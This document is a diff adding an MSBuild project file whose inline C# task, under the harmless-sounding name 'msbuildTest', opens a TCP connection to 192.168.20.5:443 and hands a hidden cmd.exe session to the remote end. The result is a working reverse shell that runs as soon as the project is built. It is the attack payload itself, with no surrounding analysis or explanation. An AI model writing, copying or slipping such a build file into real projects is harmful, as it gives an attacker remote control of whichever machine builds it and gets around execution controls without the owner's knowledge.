@@ -1,0 +1,74 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<Target Name="msbuildTest">
+<msbuildTest/>
+</Target>
+<UsingTask 
+    TaskName="msbuildTest"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" > 
+      <Task>
+      
+        <Code Type="Class" Language="cs">
+         <![CDATA[ 
+            using System;
+            using System.Diagnostics;
+            using System.IO;
+            using System.Net.Sockets;
+            using System.Text;
+            using Microsoft.Build.Framework; 
+            using Microsoft.Build.Utilities; 
+            using System.Collections.ObjectModel;
+            public class msbuildTest : Task 
+            {
+                public static StreamWriter streamWriter;
+                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+                 {
+                        StringBuilder strOutput = new StringBuilder();
+                        if (!String.IsNullOrEmpty(outLine.Data))
+                        {
+                            try
+                            {
+                                strOutput.Append(outLine.Data);
+                                streamWriter.WriteLine(strOutput);
+                                streamWriter.Flush();
+                            }
+                            catch (Exception ex) { throw ex; }
+                        }
+                 }
+                 public override bool Execute()  
+                 {
+                     using (TcpClient client = new TcpClient("192.168.20.5", 443))
+                        {
+                            using (Stream stream = client.GetStream())
+                            {
+                                using (StreamReader rdr = new StreamReader(stream))
+                                {
+                                    streamWriter = new StreamWriter(stream);
+                                    StringBuilder strInput = new StringBuilder();
+                                    Process p = new Process();
+                                    p.StartInfo.FileName = "cmd.exe"; 
+                                    p.StartInfo.CreateNoWindow = true;
+                                    p.StartInfo.UseShellExecute = false;
+                                    p.StartInfo.RedirectStandardOutput = true;
+                                    p.StartInfo.RedirectStandardInput = true;
+                                    p.StartInfo.RedirectStandardError = true;
+                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                                    p.Start();
+                                    p.BeginOutputReadLine();
+                                    while (true)
+                                    {
+                                        strInput.Append(rdr.ReadLine());
+                                        p.StandardInput.WriteLine(strInput);
+                                        strInput.Remove(0, strInput.Length);
+                                    }
+                                }
+                            }
+                        }
+                 }
+            
+            }
+         ]]>
+        </Code>      
+      </Task>
+</UsingTask>
+</Project>
